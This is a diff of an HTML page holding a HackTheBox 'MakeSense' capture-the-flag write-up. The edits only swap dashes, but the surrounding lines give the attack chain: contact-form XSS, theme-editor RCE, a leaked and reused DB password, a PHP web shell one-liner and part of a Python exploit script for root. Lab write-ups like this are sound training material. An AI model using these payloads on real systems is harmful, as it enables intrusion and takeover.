@@ -4,7 +4,7 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta name="theme-color" content="#030305"/>
-<title>MakeSense — HTB Write Up | pumkin</title>
+<title>MakeSense - HTB Write Up | pumkin</title>
 <meta name="description" content="HackTheBox MakeSense (Medium, Linux) full write up: stored XSS admin hijack → WP theme editor RCE → password reuse → internal OCR service arbitrary file write → root."/>
 <link rel="icon" href="../cat.png"/>
 <style>
@@ -76,7 +76,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
       </div>
 
       <h2>Summary</h2>
-      <p>MakeSense is a WordPress box won through a chain of misconfigurations and credential reuse. A <strong>stored XSS in the contact form</strong> hijacks the admin session, giving wp-admin access. The <strong>Theme File Editor</strong> drops PHP into <code>footer.php</code> for a <code>www-data</code> shell, and a reused database password pivots to <code>walter</code> over SSH. Finally, an internal <strong>OCR service</strong> (Basic Auth, same password) saves OCR output without any file/content validation — a rendered-PNG PHP payload is "recognized", written as <code>shell.php</code>, and gives a root shell.</p>
+      <p>MakeSense is a WordPress box won through a chain of misconfigurations and credential reuse. A <strong>stored XSS in the contact form</strong> hijacks the admin session, giving wp-admin access. The <strong>Theme File Editor</strong> drops PHP into <code>footer.php</code> for a <code>www-data</code> shell, and a reused database password pivots to <code>walter</code> over SSH. Finally, an internal <strong>OCR service</strong> (Basic Auth, same password) saves OCR output without any file/content validation - a rendered-PNG PHP payload is "recognized", written as <code>shell.php</code>, and gives a root shell.</p>
 
       <h2>Skills Required</h2>
       <ul>
@@ -93,7 +93,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
       </ul>
 
       <h2>Enumeration</h2>
-      <p>A full port scan shows only SSH and HTTPS — an Apache-served WordPress site.</p>
+      <p>A full port scan shows only SSH and HTTPS - an Apache-served WordPress site.</p>
       <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-07 07:55 -0400
 Nmap scan report for makesense.htb (10.129.41.78)
 Host is up (0.047s latency).
@@ -114,7 +114,7 @@ PORT    STATE SERVICE  VERSION
 [+] jake
 [+] admin
 [+] walter</pre>
-      <p>No vulnerable plugins or themes — but three users are enumerated, and the custom <code>webagency</code> theme is worth a closer look.</p>
+      <p>No vulnerable plugins or themes - but three users are enumerated, and the custom <code>webagency</code> theme is worth a closer look.</p>
 
       <h2>Foothold</h2>
       <h3>Hardcoded key in the theme</h3>
@@ -161,7 +161,7 @@ jQuery.get(u,function(e){
 define( 'DB_NAME', 'wordpress' );
 define( 'DB_USER', 'walter' );
 define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );</pre>
-      <p>The password is reused as <code>walter</code>'s SSH password — credential reuse across DB and OS.</p>
+      <p>The password is reused as <code>walter</code>'s SSH password - credential reuse across DB and OS.</p>
       <pre>ssh walter@makesense.htb
 uid=1000(walter)</pre>
 
@@ -171,7 +171,7 @@ uid=1000(walter)</pre>
       <pre>ssh -L 8001:127.0.0.1:8001 walter@makesense.htb</pre>
 
       <h3>Arbitrary file write via OCR</h3>
-      <p>The service takes an uploaded canvas image, runs OCR, and lets you save the recognized text under a filename of your choice — <strong>with no extension or content validation</strong>.</p>
+      <p>The service takes an uploaded canvas image, runs OCR, and lets you save the recognized text under a filename of your choice - <strong>with no extension or content validation</strong>.</p>
       <pre>OCR arbitrary file write
 │       crafted PNG with PHP code as drawn text:
 │           &lt;?php system($_GET["cmd"]); ?&gt;
@@ -179,11 +179,11 @@ uid=1000(walter)</pre>
 │       saved recognized output as "shell.php" (no extension/content check)
 │       GET /saved/shell.php?cmd=id
 │       → root shell uid=0(root)</pre>
-      <p>Render the PHP payload as text into a PNG (monospace font, so OCR reads it back perfectly), post it to the OCR canvas, grab the returned <code>ocr_id</code>, and save the recognized text as <code>shell.php</code> in the saved output directory. It executes as the OCR service user — root.</p>
+      <p>Render the PHP payload as text into a PNG (monospace font, so OCR reads it back perfectly), post it to the OCR canvas, grab the returned <code>ocr_id</code>, and save the recognized text as <code>shell.php</code> in the saved output directory. It executes as the OCR service user - root.</p>
 
       <p>The whole root step is automated in a single script (target, IP-pinning, payload rendering, and the OCR round-trip):</p>
       <pre>#!/usr/bin/env python3
-# MakeSense — root via internal OCR arbitrary file write
+# MakeSense - root via internal OCR arbitrary file write
 # Walks: render PHP payload as PNG text → OCR → save as shell.php → bash -p
 import sys, os, re, json, base64, socket, subprocess, threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -240,10 +240,10 @@ print(ssh_exec(walter_pass, remote_script))</pre>
 
       <h2>Key Takeaways</h2>
       <ul>
-        <li><strong>Contact forms are a free XSS delivery channel</strong> — sanitize every input, because one admin view of submissions is all an attacker needs.</li>
+        <li><strong>Contact forms are a free XSS delivery channel</strong> - sanitize every input, because one admin view of submissions is all an attacker needs.</li>
         <li><strong>wp-admin theme editing = full RCE</strong>; treat any admin session as code execution.</li>
-        <li><strong>Passwords get reused everywhere</strong> — DB, SSH, and that "internal" service on 127.0.0.1 all took the same password.</li>
-        <li><strong>Services that save "recognized" output need validation too</strong> — an OCR tool that writes arbitrary filenames is just an arbitrary file write wearing a different hat.</li>
+        <li><strong>Passwords get reused everywhere</strong> - DB, SSH, and that "internal" service on 127.0.0.1 all took the same password.</li>
+        <li><strong>Services that save "recognized" output need validation too</strong> - an OCR tool that writes arbitrary filenames is just an arbitrary file write wearing a different hat.</li>
       </ul>
 
     </div>
